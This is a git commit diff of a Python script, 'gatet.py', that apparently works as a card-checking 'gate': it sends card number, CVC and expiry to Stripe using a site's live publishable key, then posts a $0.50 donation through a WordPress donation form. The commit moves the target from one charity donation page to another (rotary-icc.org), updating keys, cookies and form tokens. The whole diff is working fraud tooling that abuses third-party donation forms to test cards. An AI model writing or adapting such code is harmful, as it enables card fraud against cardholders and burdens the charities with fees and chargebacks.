4e3885cf79344cef4b162d632430aa41bb4821f6
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-04-18 12:40:24 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,26 +26,25 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+card-element&referrer=https%3A%2F%2Fwww.aaronabke.com&time_on_page=52825&key=pk_live_51GGaWMAJSPmZlL2afbQZDpv2vTIB3894XGGxamKUqTCkHjOi5xT0xBMn8GYDCIiWqs2T6mFpst5ZwqnwlJzghdDC00HIeZ9lw8'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+card-element&referrer=https%3A%2F%2Frotary-icc.org&time_on_page=219351&key=pk_live_51QNL3XCVOxCQ48pBLnKJxzgU1mP4yhVrX30WnEuxvcfeu6SL5hAMIPiMQaW15QHNwdSaZOcIPPXgC05NiYVETPf300Vf8hfDZB'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'cookie_notice_accepted': 'true',
-	    '__stripe_mid': '65f075b0-bfc5-4647-b478-3594b195d66e3459f5',
-	    '__stripe_sid': '04bae8b8-3e40-4f2b-a54f-e3a750cdb59237daf8',
+	    '__stripe_mid': '47704486-18ca-4ba9-981a-8897807be7e584acb7',
+	    '__stripe_sid': 'e3bac744-1faf-4955-abed-921593c35c8bd572cf',
 	}
 	
 	headers = {
-	    'authority': 'www.aaronabke.com',
+	    'authority': 'rotary-icc.org',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'cookie_notice_accepted=true; __stripe_mid=65f075b0-bfc5-4647-b478-3594b195d66e3459f5; __stripe_sid=04bae8b8-3e40-4f2b-a54f-e3a750cdb59237daf8',
-	    'origin': 'https://www.aaronabke.com',
-	    'referer': 'https://www.aaronabke.com/donate/',
+	    # 'cookie': '__stripe_mid=47704486-18ca-4ba9-981a-8897807be7e584acb7; __stripe_sid=e3bac744-1faf-4955-abed-921593c35c8bd572cf',
+	    'origin': 'https://rotary-icc.org',
+	    'referer': 'https://rotary-icc.org/donate/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -57,17 +56,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1744935267616',
+	    't': '1744954533172',
 	}
 	
 	data = {
-	    'data': 'item_4__fluent_sf=&__fluent_form_embded_post_id=884&_fluentform_4_fluentformnonce=a458ecc2cf&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&custom-payment-amount=0.50&payment_input=0&payment_input_custom_0=0&payment_input_custom_1=&input_text=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'data': 'item_9__fluent_sf=&__fluent_protection_token_9=JUl0JN11pyWdSRiKyUFK4mPsauNhQ%2Be%2F7LHIp9AP7JpusefMj4QJC5xAqK3oMLCTuJGE0lnGb%2F1soI1l9nA4hv3G5IDw%2FKASSzpY5F4TXlUK3Od%2Bkb5ChKJN4zYtrzcB&__fluent_form_embded_post_id=37966&_fluentform_9_fluentformnonce=8303e6be02&_wp_http_referer=%2Fdonate%2F&first_name=Rodam&last_name=User&email=rodamuser08%40gmail.com&club=New%20York&amount=Custom%20amount&custom_amount=0.50&payment_method=stripe&comments=&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '4',
+	    'form_id': '9',
 	}
 	
 	r2 = requests.post(
-	    'https://www.aaronabke.com/wp-admin/admin-ajax.php',
+	    'https://rotary-icc.org/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
